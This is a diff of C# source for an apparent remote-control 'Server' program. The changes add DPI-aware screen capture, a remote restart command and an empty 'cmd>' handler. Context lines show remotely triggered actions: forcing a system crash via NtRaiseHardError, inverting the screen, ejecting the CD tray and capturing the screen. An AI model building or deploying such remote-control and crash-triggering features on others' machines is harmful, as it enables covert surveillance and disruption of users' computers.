@@ -26,6 +26,10 @@ namespace Server
 {
     class Program
     {
+        //õige scaling
+        [DllImport("user32.dll")]
+        private static extern bool SetProcessDPIAware();
+
         //cdtray
         [DllImport("winmm.dll")]
         private static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);
@@ -501,6 +505,11 @@ namespace Server
                             size.Height = Convert.ToInt32(parts[1]);
                         }
 
+                        if (receivedData.StartsWith("cmd>"))
+                        {
+                            
+                        }
+
 
                         switch (receivedData)
                         {
@@ -578,6 +587,20 @@ namespace Server
                                 int y = Screen.PrimaryScreen.Bounds.Height;
                                 StretchBlt(screenDC, 0, 0, x, y, screenDC, 0, 0, x, y, 0x00330008);
                                 break;
+
+
+                            case "restartServer":
+
+                                ProcessStartInfo startInfo = new ProcessStartInfo(Application.ExecutablePath)
+                                {
+                                    UseShellExecute = true
+                                };
+
+                                Process.Start(startInfo);
+                                Environment.Exit(0);
+
+                                break;
+
 
                             default: break;
                         }
@@ -886,6 +909,8 @@ namespace Server
             NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out uint t2);
         }
 
+
+
         static string GetSystemInfo()
         {
             try
@@ -1069,20 +1094,25 @@ namespace Server
 
 
 
+
         static Bitmap CaptureScreen()
         {
-            Rectangle bounds = Screen.AllScreens[0].Bounds;
+            //muidu ei tööta kui screen scaling on üle 100%
+            SetProcessDPIAware();
+
+            Rectangle bounds = Screen.PrimaryScreen.Bounds;
+
+            // Create bitmap with physical pixel size
             Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height);
 
             using (Graphics g = Graphics.FromImage(screenshot))
             {
-                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
 
                 Cursor currentCursor = Cursors.Default;
                 if (currentCursor != null)
                 {
                     Point cursorPos = Cursor.Position;
-
                     Rectangle cursorBounds = new Rectangle(cursorPos, currentCursor.Size);
                     currentCursor.Draw(g, cursorBounds);
                 }
